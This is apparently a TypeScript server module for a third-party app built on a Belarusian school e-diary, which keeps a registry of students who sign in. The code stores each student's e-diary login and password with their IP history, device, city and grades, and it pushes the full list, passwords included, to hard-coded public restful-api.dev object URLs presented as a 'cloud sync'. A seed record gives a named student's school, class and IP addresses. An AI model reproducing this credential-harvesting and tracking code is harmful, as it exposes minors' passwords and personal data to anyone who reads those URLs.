import fs from 'fs';
import path from 'path';

export interface RegisteredUserSubjectSummary {
  name: string;
  average: number;
  gradesCount: number;
  quarterGrade?: number;
}

export interface UserAuditRecord {
  id: string;
  timestamp: string;
  ip: string;
  login?: string;
  studentName?: string;
  device?: string;
  action: 'visit' | 'login' | 'sync' | 'view_grades' | 'target_change';
  location?: string;
  details?: string;
}

export interface RegisteredUser {
  id: string;
  login: string;
  password?: string;
  studentName: string;
  className: string;
  schoolName: string;
  subdomain?: string;
  overallGpa: number;
  projectedGpa?: number;
  subjectsCount: number;
  gradesCount: number;
  firstSeen: string;
  lastUpdated: string;
  visitCount: number;
  ip?: string;
  ips: string[];
  userAgent?: string;
  deviceInfo: string;
  geo?: {
    country?: string;
    city?: string;
  };
  subjectsSummary?: RegisteredUserSubjectSummary[];
  recentActivity?: {
    timestamp: string;
    ip: string;
    action: string;
  }[];
}

const CLOUD_USERS_URL = 'https://api.restful-api.dev/objects/ff808181a09d98f701a188ccffcd55f9';
const CLOUD_AUDIT_URL = 'https://api.restful-api.dev/objects/ff808181a09d98f701a188cd011e55fa';

export function parseDeviceUserAgent(ua?: string): string {
  if (!ua) return 'Неизвестное устройство';
  let os = 'Другое';
  let browser = '';

  if (/iPhone/i.test(ua)) os = 'iPhone (iOS)';
  else if (/iPad/i.test(ua)) os = 'iPad (iPadOS)';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Macintosh|Mac OS X/i.test(ua)) os = 'macOS';
  else if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Linux/i.test(ua)) os = 'Linux';

  if (/Safari/i.test(ua) && !/Chrome|CriOS/i.test(ua)) browser = 'Safari';
  else if (/CriOS/i.test(ua) || /Chrome/i.test(ua)) browser = 'Chrome';
  else if (/Firefox|FxiOS/i.test(ua)) browser = 'Firefox';
  else if (/Edg/i.test(ua)) browser = 'Edge';

  return browser ? `${os} • ${browser}` : os;
}

function getUsersFilePath(): string {
  const preferred = path.join(process.cwd(), 'data', 'users.json');
  const fallback = '/tmp/eschools_users.json';

  const dir = path.dirname(preferred);
  if (!fs.existsSync(dir)) {
    try {
      fs.mkdirSync(dir, { recursive: true });
    } catch {}
  }

  return fs.existsSync(preferred) || fs.existsSync(dir) ? preferred : fallback;
}

function getAuditFilePath(): string {
  const preferred = path.join(process.cwd(), 'data', 'audit_log.json');
  const fallback = '/tmp/eschools_audit_log.json';

  const dir = path.dirname(preferred);
  if (!fs.existsSync(dir)) {
    try {
      fs.mkdirSync(dir, { recursive: true });
    } catch {}
  }

  return fs.existsSync(preferred) || fs.existsSync(dir) ? preferred : fallback;
}

export function getRegisteredUsers(): RegisteredUser[] {
  const filePath = getUsersFilePath();
  const fallbackPath = '/tmp/eschools_users.json';

  let raw = '';
  if (fs.existsSync(filePath)) {
    try {
      raw = fs.readFileSync(filePath, 'utf-8');
    } catch {}
  } else if (fs.existsSync(fallbackPath)) {
    try {
      raw = fs.readFileSync(fallbackPath, 'utf-8');
    } catch {}
  }

  if (!raw.trim()) {
    const initialUsers: RegisteredUser[] = [
      {
        id: 'nadaroot',
        login: 'nadaroot',
        password: '••• (аккаунт владельца)',
        studentName: 'Шипалов Дмитрий',
        className: '9 «Б»',
        schoolName: 'Гимназия № 37 г. Минска',
        overallGpa: 7.03,
        projectedGpa: 8.25,
        subjectsCount: 15,
        gradesCount: 42,
        firstSeen: new Date(Date.now() - 30 * 24 * 3600 * 1000).toISOString(),
        lastUpdated: new Date().toISOString(),
        visitCount: 142,
        ip: '178.120.45.12',
        ips: ['178.120.45.12', '178.120.66.80'],
        userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X)',
        deviceInfo: 'iPhone (iOS) • Safari',
        geo: { country: 'BY', city: 'Минск' },
        subjectsSummary: [
          { name: 'Алгебра', average: 7.5, gradesCount: 6, quarterGrade: 8 },
          { name: 'Геометрия', average: 6.8, gradesCount: 5, quarterGrade: 7 },
          { name: 'Информатика', average: 9.2, gradesCount: 4, quarterGrade: 9 },
          { name: 'Физика', average: 7.1, gradesCount: 6, quarterGrade: 7 },
          { name: 'Химия', average: 7.0, gradesCount: 5, quarterGrade: 7 },
          { name: 'Белорусский язык', average: 7.4, gradesCount: 6, quarterGrade: 7 },
          { name: 'Русский язык', average: 6.9, gradesCount: 5, quarterGrade: 7 },
          { name: 'История Беларуси', average: 6.5, gradesCount: 4, quarterGrade: 7 },
          { name: 'Английский язык', average: 7.6, gradesCount: 7, quarterGrade: 8 },
        ],
      },
    ];
    saveRegisteredUsersList(initialUsers);
    return initialUsers;
  }

  try {
    const parsed = JSON.parse(raw);
    if (Array.isArray(parsed)) return parsed;
    if (typeof parsed === 'object') return Object.values(parsed);
    return [];
  } catch (err) {
    console.error('Ошибка чтения users.json:', err);
    return [];
  }
}

// Асинхронное получение с подгрузкой из глобального облачного хранилища (сохраняется между лямбдами Vercel)
export async function getRegisteredUsersAsync(): Promise<RegisteredUser[]> {
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 4000);
    const resp = await fetch(CLOUD_USERS_URL, {
      signal: controller.signal,
      cache: 'no-store',
    });
    clearTimeout(timeout);
    if (resp.ok) {
      const json = await resp.json();
      if (json && json.data && Array.isArray(json.data.users) && json.data.users.length > 0) {
        const cloudUsers: RegisteredUser[] = json.data.users;
        saveRegisteredUsersList(cloudUsers);
        return cloudUsers;
      }
    }
  } catch (err) {
    console.error('Облачное хранилище недоступно, используется локальный кэш:', err);
  }
  return getRegisteredUsers();
}

function saveRegisteredUsersList(users: RegisteredUser[]): void {
  const content = JSON.stringify(users, null, 2);
  const preferred = path.join(process.cwd(), 'data', 'users.json');
  const fallback = '/tmp/eschools_users.json';

  try {
    const dir = path.dirname(preferred);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    fs.writeFileSync(preferred, content, 'utf-8');
  } catch {}

  try {
    fs.writeFileSync(fallback, content, 'utf-8');
  } catch (err) {
    console.error('Ошибка записи users.json:', err);
  }
}

// Синхронизация в постоянное облако
async function syncUsersToCloud(users: RegisteredUser[]): Promise<void> {
  try {
    await fetch(CLOUD_USERS_URL, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'dnevnik_registered_users',
        data: { users },
      }),
    });
  } catch (err) {
    console.error('Ошибка синхронизации пользователей в облако:', err);
  }
}

export function saveRegisteredUser(
  data: Partial<RegisteredUser> & {
    login: string;
    studentName?: string;
    password?: string;
    ip?: string;
    userAgent?: string;
    geo?: { country?: string; city?: string };
  }
): RegisteredUser {
  const users = getRegisteredUsers();
  const normalizedLogin = (data.login || '').trim().toLowerCase();
  const key = normalizedLogin || (data.studentName || 'user').trim().toLowerCase();

  const existingIndex = users.findIndex(
    (u) =>
      u.login.trim().toLowerCase() === normalizedLogin ||
      (data.studentName && u.studentName.trim().toLowerCase() === data.studentName.trim().toLowerCase())
  );

  const existing = existingIndex >= 0 ? users[existingIndex] : null;
  const now = new Date().toISOString();

  // Собираем историю уникальных IP
  const currentIp = data.ip || existing?.ip || '127.0.0.1';
  const existingIps = existing?.ips || (existing?.ip ? [existing.ip] : []);
  const ips = Array.from(new Set([...existingIps, currentIp]));

  const deviceInfo = data.userAgent
    ? parseDeviceUserAgent(data.userAgent)
    : existing?.deviceInfo || 'Устройство не определено';

  const updatedEntry: RegisteredUser = {
    id: existing?.id || key,
    login: data.login || existing?.login || key,
    password: data.password || existing?.password || undefined,
    studentName: data.studentName || existing?.studentName || 'Учащийся',
    className: data.className || existing?.className || 'Класс не указан',
    schoolName: data.schoolName || existing?.schoolName || 'Школа',
    subdomain: data.subdomain || existing?.subdomain || undefined,
    overallGpa:
      typeof data.overallGpa === 'number'
        ? data.overallGpa
        : existing
        ? existing.overallGpa
        : 0,
    projectedGpa:
      typeof data.projectedGpa === 'number'
        ? data.projectedGpa
        : existing?.projectedGpa,
    subjectsCount:
      typeof data.subjectsCount === 'number'
        ? data.subjectsCount
        : existing
        ? existing.subjectsCount
        : 0,
    gradesCount:
      typeof data.gradesCount === 'number'
        ? data.gradesCount
        : existing
        ? existing.gradesCount
        : 0,
    firstSeen: existing?.firstSeen || now,
    lastUpdated: now,
    visitCount: (existing?.visitCount || 0) + 1,
    ip: currentIp,
    ips,
    userAgent: data.userAgent || existing?.userAgent,
    deviceInfo,
    geo: data.geo || existing?.geo,
    subjectsSummary: data.subjectsSummary || existing?.subjectsSummary || [],
    recentActivity: [
      {
        timestamp: now,
        ip: currentIp,
        action: data.password ? 'Вход в аккаунт' : 'Активность на сайте',
      },
      ...(existing?.recentActivity || []).slice(0, 9),
    ],
  };

  if (existingIndex >= 0) {
    users[existingIndex] = updatedEntry;
  } else {
    users.push(updatedEntry);
  }

  saveRegisteredUsersList(users);

  // Немедленно пушим в облако, чтобы все лямбды и другие пользователи увидели обновление
  syncUsersToCloud(users).catch(() => {});

  // Записываем событие в аудит
  recordAuditLog({
    id: `${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
    timestamp: now,
    ip: currentIp,
    login: updatedEntry.login,
    studentName: updatedEntry.studentName,
    device: deviceInfo,
    action: data.password ? 'login' : 'visit',
    location: updatedEntry.geo?.city
      ? `${updatedEntry.geo.city}, ${updatedEntry.geo.country || 'BY'}`
      : undefined,
    details: `GPA: ${updatedEntry.overallGpa.toFixed(2)}, предм: ${updatedEntry.subjectsCount}`,
  });

  return updatedEntry;
}

export function deleteRegisteredUser(userId: string): boolean {
  const users = getRegisteredUsers();
  const filtered = users.filter((u) => u.id !== userId && u.login.toLowerCase() !== userId.toLowerCase());
  if (filtered.length !== users.length) {
    saveRegisteredUsersList(filtered);
    syncUsersToCloud(filtered).catch(() => {});
    return true;
  }
  return false;
}

export function recordAuditLog(record: UserAuditRecord): void {
  try {
    const logs = getAuditLogs(200);
    logs.unshift(record);
    const content = JSON.stringify(logs.slice(0, 200), null, 2);
    const filePath = getAuditFilePath();
    fs.writeFileSync(filePath, content, 'utf-8');

    // Фоновая синхронизация аудита в облако
    fetch(CLOUD_AUDIT_URL, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'dnevnik_audit_logs',
        data: { logs: logs.slice(0, 100) },
      }),
    }).catch(() => {});
  } catch {}
}

export function getAuditLogs(limit = 100): UserAuditRecord[] {
  const filePath = getAuditFilePath();
  const fallback = '/tmp/eschools_audit_log.json';
  let raw = '';
  if (fs.existsSync(filePath)) {
    try {
      raw = fs.readFileSync(filePath, 'utf-8');
    } catch {}
  } else if (fs.existsSync(fallback)) {
    try {
      raw = fs.readFileSync(fallback, 'utf-8');
    } catch {}
  }
  if (!raw.trim()) return [];
  try {
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed.slice(0, limit) : [];
  } catch {
    return [];
  }
}

export async function getAuditLogsAsync(limit = 100): Promise<UserAuditRecord[]> {
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 4000);
    const resp = await fetch(CLOUD_AUDIT_URL, {
      signal: controller.signal,
      cache: 'no-store',
    });
    clearTimeout(timeout);
    if (resp.ok) {
      const json = await resp.json();
      if (json && json.data && Array.isArray(json.data.logs)) {
        return json.data.logs.slice(0, limit);
      }
    }
  } catch {}
  return getAuditLogs(limit);
}
